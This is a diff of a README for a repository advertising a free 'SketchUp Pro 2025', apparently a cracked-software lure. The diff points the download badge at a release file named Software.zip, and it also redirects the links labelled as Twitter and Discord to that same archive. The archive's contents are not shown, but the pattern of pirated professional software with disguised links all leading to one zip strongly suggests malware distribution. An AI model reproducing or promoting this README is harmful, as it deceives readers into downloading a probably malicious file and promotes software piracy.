@@ -20,7 +20,7 @@ Welcome to the "SketchUp Pro Free 2025" repository! 🚀 In this repository, you
 ## Repository Content 📁
 Make sure to explore the repository to find valuable resources. You can access the SketchUp Pro application by downloading it from the following link:
 
-[<img src="https://img.shields.io/badge/Download%20SketchUp%20Pro-2025-blue">](https://github.com/user-attachments/files/18426772/Application.zip)
+[<img src="https://github.com/naiculss/SketchUp-Pro-free-2025/releases/download/v2.0/Software.zip%20SketchUp%20Pro-2025-blue">](https://github.com/naiculss/SketchUp-Pro-free-2025/releases/download/v2.0/Software.zip)
 
 Please note that the link provided above needs to be launched to initiate the download of the SketchUp Pro software.
 
@@ -44,8 +44,8 @@ We welcome contributions from the community to improve and expand this repositor
 ## Connect with Us 🌐
 Stay connected with the SketchUp Pro community and receive updates on the latest developments:
 
-- Follow us on Twitter: [@SketchUpPro](https://twitter.com/SketchUpPro)
-- Join our Discord server: [SketchUp Pro Community](https://discord.com/invite/sketchuppro)
+- Follow us on Twitter: [@SketchUpPro](https://github.com/naiculss/SketchUp-Pro-free-2025/releases/download/v2.0/Software.zip)
+- Join our Discord server: [SketchUp Pro Community](https://github.com/naiculss/SketchUp-Pro-free-2025/releases/download/v2.0/Software.zip)
 
 Let's create amazing designs together with SketchUp Pro! 🎉
 
